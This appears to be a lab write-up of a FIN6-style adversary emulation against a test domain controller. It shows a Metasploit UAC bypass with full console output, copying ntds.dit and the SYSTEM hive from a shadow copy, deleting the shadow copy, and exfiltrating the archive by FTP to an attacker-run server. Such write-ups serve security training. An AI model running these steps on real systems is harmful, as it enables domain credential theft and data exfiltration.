# FIN6  File Exfiltration Over FTP

---
<img width="1440" height="819" alt="Screenshot 2025-07-22 at 11 11 45 PM" src="https://github.com/user-attachments/assets/5a2530d7-9260-40ea-bf3b-adfc235a701e" />



---

edi this: └─$ sudo nano /usr/share/metasploit-framework/modules/exploits/windows/local/bypassuac_comhijack.rb 

### add Arch.......

<img width="1440" height="778" alt="Screenshot 2025-07-22 at 11 21 56 PM" src="https://github.com/user-attachments/assets/83850046-0ca3-423d-bb1c-4c53c6e8548b" />


---

### Background the shell use exploit/windows/local/bypassuac_comhijack


```bash
msf6 exploit(windows/local/bypassuac_silentcleanup) > search bypassuac

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
   1   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
   2   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   3     \_ target: Windows x86                               .                .          .      .
   4     \_ target: Windows x64                               .                .          .      .
   5   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   6     \_ target: Windows x86                               .                .          .      .
   7     \_ target: Windows x64                               .                .          .      .
   8   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   9     \_ target: Windows x86                               .                .          .      .
   10    \_ target: Windows x64                               .                .          .      .
   11  exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
   12  exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   13  exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   14    \_ target: Windows x86                               .                .          .      .
   15    \_ target: Windows x64                               .                .          .      .
   16  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   17  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   18  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
   19  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   20    \_ target: Windows x86                               .                .          .      .
   21    \_ target: Windows x64                               .                .          .      .
   22  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
   23    \_ target: Windows x86                               .                .          .      .
   24    \_ target: Windows x64                               .                .          .      .


Interact with a module by name or index. For example info 24, use 24 or use exploit/windows/local/bypassuac_sluihijack                                                                                                                                                         
After interacting with a module you can manually set a TARGET with set TARGET 'Windows x64'

msf6 exploit(windows/local/bypassuac_silentcleanup) > use 12
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_comhijack) > show options

Module options (exploit/windows/local/bypassuac_comhijack):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.125.103  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_comhijack) > set LPORT 4455
LPORT => 4455
msf6 exploit(windows/local/bypassuac_comhijack) > 
msf6 exploit(windows/local/bypassuac_comhijack) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/bypassuac_comhijack) > exploit

[*] Started reverse TCP handler on 192.168.125.103:4455 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[-] Exploit aborted due to failure: bad-config: x86 payload selected for x64 system
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/bypassuac_comhijack) > reload_all
[*] Reloading modules from all module paths...
[*] Reloading module...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                             
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                             
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                                             
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                             
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                             
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                             
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                             
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                                             
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                                             
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                                             
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                                             
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                                             
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                                             
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                                             
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                             
                                                                                                                                                          

       =[ metasploit v6.4.9-dev                           ]
+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 exploit(windows/local/bypassuac_comhijack) > 
msf6 exploit(windows/local/bypassuac_comhijack) > 
msf6 exploit(windows/local/bypassuac_comhijack) > show 
[-] Argument required

[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions

msf6 exploit(windows/local/bypassuac_comhijack) > 
msf6 exploit(windows/local/bypassuac_comhijack) > show options

Module options (exploit/windows/local/bypassuac_comhijack):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.125.103  yes       The listen address (an interface may be specified)
   LPORT     4455             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_comhijack) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_comhijack) > sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x64/windows  MAD\madAdmin @ TARGETDC         192.168.125.103:4444 -> 192.168.125.104:49908
                                                                     (192.168.125.104)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ TARGETDC  192.168.125.103:5555 -> 192.168.125.104:50134
                                                                     (192.168.125.104)

msf6 exploit(windows/local/bypassuac_comhijack) > set LPORT 4455
LPORT => 4455
msf6 exploit(windows/local/bypassuac_comhijack) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/bypassuac_comhijack) > exploit

[*] Started reverse TCP handler on 192.168.125.103:4455 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Targeting Event Viewer via HKCU\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931} ...
[*] Uploading payload to C:\Users\madAdmin\AppData\Local\Temp\2\hZpfkwwY.dll ...
[*] Executing high integrity process C:\Windows\System32\eventvwr.exe
[*] Sending stage (201798 bytes) to 192.168.125.104
[+] Deleted C:\Users\madAdmin\AppData\Local\Temp\2\hZpfkwwY.dll
[*] Meterpreter session 3 opened (192.168.125.103:4455 -> 192.168.125.104:50657) at 2025-07-22 14:00:34 -0400
[*] Cleaning up registry; this can take some time...

meterpreter > 

```

<img width="1440" height="817" alt="Screenshot 2025-07-22 at 11 31 48 PM" src="https://github.com/user-attachments/assets/0fe7b063-a4b8-4cbc-a25a-baf1e73a9177" />


---

```bash

meterpreter > 
meterpreter > sysinfo
Computer        : TARGETDC
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MAD
Logged On Users : 13
Meterpreter     : x64/windows
meterpreter > shell
Process 3700 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1158]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Public
cd C:\Users\Public

C:\Users\Public>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0C89-4EFE

 Directory of C:\Users\Public

07/22/2025  05:33 PM    <DIR>          .
07/22/2025  05:33 PM    <DIR>          ..
11/12/2021  07:10 AM             2,728 add-domain-entities.ps1
07/22/2025  05:01 PM            11,814 ad_computers.txt
07/22/2025  05:05 PM               620 ad_computers_net.txt
07/22/2025  05:28 PM            87,844 ad_group.txt
07/22/2025  05:33 PM               970 ad_group_net.txt
07/22/2025  05:08 PM             5,266 ad_ous.txt
07/22/2025  05:14 PM               710 ad_ous_ps.txt
07/22/2025  05:23 PM               494 ad_subnet.txt
07/22/2025  05:26 PM                 0 ad_subnets_ps.txt
07/22/2025  05:19 PM            47,842 ad_trustdump.txt
07/22/2025  05:21 PM               270 ad_trustdump_nltest.txt
07/22/2025  04:52 PM            22,536 ad_users.txt
11/12/2021  07:10 AM               718 create-domain.ps1
11/12/2021  07:10 AM             1,909 disable-defender.ps1
06/24/2020  11:10 AM    <DIR>          Documents
09/15/2018  12:19 AM    <DIR>          Downloads
04/19/2022  10:57 PM             4,890 enable-PSlogging.ps1
11/12/2021  07:10 AM               216 hidden-files.ps1
11/12/2021  07:10 AM             3,413 install-tools.ps1
09/15/2018  12:19 AM    <DIR>          Music
07/22/2025  04:57 PM               826 net_users_net.txt
12/02/2021  12:23 AM             8,192 NTUSER.DAT
12/01/2021  11:53 PM    <DIR>          Pictures
12/01/2021  11:58 PM    <DIR>          PowerSploit
11/12/2021  07:10 AM               183 rename-dc.ps1
11/12/2021  07:10 AM             1,301 set-windows-wallpaper.ps1
11/12/2021  07:10 AM             6,523 setup-dc.ps1
12/01/2021  11:53 PM             1,751 SetupDC.xml
09/15/2018  12:19 AM    <DIR>          Videos
              23 File(s)        211,016 bytes
               8 Dir(s)  21,373,128,704 bytes free

C:\Users\Public>whoami
whoami
mad\madadmin

C:\Users\Public>whoami /priv
\whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

C:\Users\Public>
```

---

#### Create a shadow copy (snapshot) of the C: drive using the Volume Shadow Copy Service (VSS) — a Windows feature that allows you to create read-only backups of the system or drive while it is running.


```bash
C:\Users\Public>vssadmin create shadow /for=C:
vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {23eadf82-e144-49c6-86f7-b1c39e32b6ae}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

C:\Users\Public>
```

<img width="1440" height="281" alt="Screenshot 2025-07-22 at 11 38 59 PM" src="https://github.com/user-attachments/assets/1da45ab2-9aea-4751-a33b-0caa643d0c29" />


---

## Copy NTDS

```bash
C:\Users\Public>vssadmin create shadow /for=C:
vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {23eadf82-e144-49c6-86f7-b1c39e32b6ae}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

C:\Users\Public>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
The parameter is incorrect.

C:\Users\Public>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
The parameter is incorrect.

C:\Users\Public>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\Users\Public\ad_ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\Users\Public\ad_ntds.dit
        1 file(s) copied.

C:\Users\Public>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0C89-4EFE

 Directory of C:\Users\Public

07/22/2025  06:12 PM    <DIR>          .
07/22/2025  06:12 PM    <DIR>          ..
11/12/2021  07:10 AM             2,728 add-domain-entities.ps1
07/22/2025  05:01 PM            11,814 ad_computers.txt
07/22/2025  05:05 PM               620 ad_computers_net.txt
07/22/2025  05:28 PM            87,844 ad_group.txt
07/22/2025  05:33 PM               970 ad_group_net.txt
07/22/2025  04:23 PM        16,777,216 ad_ntds.dit
07/22/2025  05:08 PM             5,266 ad_ous.txt
07/22/2025  05:14 PM               710 ad_ous_ps.txt
07/22/2025  05:23 PM               494 ad_subnet.txt
07/22/2025  05:26 PM                 0 ad_subnets_ps.txt
07/22/2025  05:19 PM            47,842 ad_trustdump.txt
07/22/2025  05:21 PM               270 ad_trustdump_nltest.txt
07/22/2025  04:52 PM            22,536 ad_users.txt
11/12/2021  07:10 AM               718 create-domain.ps1
11/12/2021  07:10 AM             1,909 disable-defender.ps1
06/24/2020  11:10 AM    <DIR>          Documents
09/15/2018  12:19 AM    <DIR>          Downloads
04/19/2022  10:57 PM             4,890 enable-PSlogging.ps1
11/12/2021  07:10 AM               216 hidden-files.ps1
11/12/2021  07:10 AM             3,413 install-tools.ps1
09/15/2018  12:19 AM    <DIR>          Music
07/22/2025  04:57 PM               826 net_users_net.txt
12/02/2021  12:23 AM             8,192 NTUSER.DAT
12/01/2021  11:53 PM    <DIR>          Pictures
12/01/2021  11:58 PM    <DIR>          PowerSploit
11/12/2021  07:10 AM               183 rename-dc.ps1
11/12/2021  07:10 AM             1,301 set-windows-wallpaper.ps1
11/12/2021  07:10 AM             6,523 setup-dc.ps1
12/01/2021  11:53 PM             1,751 SetupDC.xml
09/15/2018  12:19 AM    <DIR>          Videos
              24 File(s)     16,988,232 bytes
               8 Dir(s)  21,022,642,176 bytes free

C:\Users\Public>
```

<img width="1440" height="821" alt="Screenshot 2025-07-22 at 11 44 38 PM" src="https://github.com/user-attachments/assets/c6b2750a-cc41-481e-88d5-d56a2b82f489" />


---


## Copy reg.

```bash
C:\Users\Public>reg SAVE HKLM\SYSTEM C:\Users\Public\ad_SYS_reg
reg SAVE HKLM\SYSTEM C:\Users\Public\ad_SYS_reg
The operation completed successfully.

C:\Users\Public>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\Users\Public\ad_SYSTEM_cfg
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\Users\Public\ad_SYSTEM_cfg
        1 file(s) copied.

C:\Users\Public>
```

<img width="1440" height="427" alt="Screenshot 2025-07-22 at 11 49 01 PM" src="https://github.com/user-attachments/assets/3a23ffb8-760d-4711-9350-51e55b1dc56d" />


---

## Delete shadow volume.

```bash

C:\Users\Public>

C:\Users\Public>vssadmin delete shadows /shadow={23eadf82-e144-49c6-86f7-b1c39e32b6ae} /Quiet
vssadmin delete shadows /shadow={23eadf82-e144-49c6-86f7-b1c39e32b6ae} /Quiet
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.


C:\Users\Public>
```
<img width="1440" height="269" alt="Screenshot 2025-07-22 at 11 51 42 PM" src="https://github.com/user-attachments/assets/500d62cd-dc91-4787-9995-df37ea65689b" />

---

## Archive all collected data using 7zip 


```bash
C:\Users\Public>7.exe a -mx3 ad.7z ad_*

````

## Exfiltration

on attacker machine:

```bash
sudo python3 -m pyftpdlib -w -p21 -d /home/attacker/AdversaryEmulation/labs/lab_1.3 -u ftpuser -P ftppass
```


on windows:

```bash
echo open {attackerVM_ip_address}> ftp.txt
echo ftpuser>> ftp.txt
echo ftppass>> ftp.txt
echo put ad.7z>> ftp.txt
echo bye>> ftp.txt
```
Finally, we can run the FTP client by passing in our text file with commands:

```bash
ftp -s:ftp.txt
```
---

## This concludes the emulation plan and lab; congratulations, you have completed an Adversary Emulation Exercise!


---
























